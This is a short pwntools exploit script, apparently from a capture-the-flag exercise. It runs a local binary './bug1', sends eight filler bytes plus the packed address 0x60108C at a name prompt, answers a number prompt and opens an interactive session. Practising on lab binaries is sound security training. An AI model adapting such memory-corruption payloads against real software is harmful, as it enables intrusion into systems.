from pwn import *

context.log_level='debug'
io=process("./bug1")
payload='a'*8+p64(0x60108C)
io.recvuntil("Input your name:")
io.sendline(payload)
io.recvline("Input your number:")
io.sendline("1")
io.interactive()